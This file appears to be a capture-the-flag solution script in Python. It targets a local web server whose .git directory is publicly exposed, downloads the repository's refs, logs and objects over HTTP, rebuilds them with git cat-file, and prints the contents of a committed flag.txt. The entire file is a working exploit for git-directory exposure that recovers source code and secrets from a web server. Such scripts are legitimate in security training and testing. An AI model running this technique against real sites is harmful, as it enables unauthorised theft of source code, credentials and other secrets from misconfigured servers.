import requests
from pathlib import Path
import shutil
import re
import subprocess

base_path = Path("solve")
shutil.rmtree(base_path, ignore_errors=True)
base_path.mkdir(parents=True)

base_url = "http://localhost:5000/"

def grab(path):
    data = requests.get(base_url + path).content
    Path(base_path, path).parent.mkdir(parents=True, exist_ok=True)
    Path(base_path, path).write_bytes(data)
    return data

def subobject(text, pattern):
    for line in text.splitlines():
        if pattern in line:
            return re.findall("[0-9a-f]{40}", line)[-1]

def objects_referenced(text):
    return set(match for match in re.findall("[0-9a-f]{40}", text) if match != '0'*40)

def catfile(object):
    return subprocess.run(['git', '-C', str(base_path/'.git'), 'cat-file', '-p', object], capture_output=True).stdout.decode()

grab(".git/refs/heads/master")
grab(".git/HEAD")
logs = grab(".git/logs/refs/heads/master")
print(logs.decode())

commits = objects_referenced(logs.decode())
objects_queue = commits
objects_seen = set()
while objects_queue:
    object = objects_queue.pop()
    objects_seen.add(object)
    print(object)
    grab(f".git/objects/{object[0:2]}/{object[2:]}")
    objects_queue |= objects_referenced(catfile(object)) - objects_seen
    
commit = subobject(logs.decode(), "Add app.py and Dockerfile")
print("Commit", commit)
print(catfile(commit))
tree = subobject(catfile(commit), "tree")
print(catfile(tree))
blob = subobject(catfile(tree), "flag.txt")
print(catfile(blob))
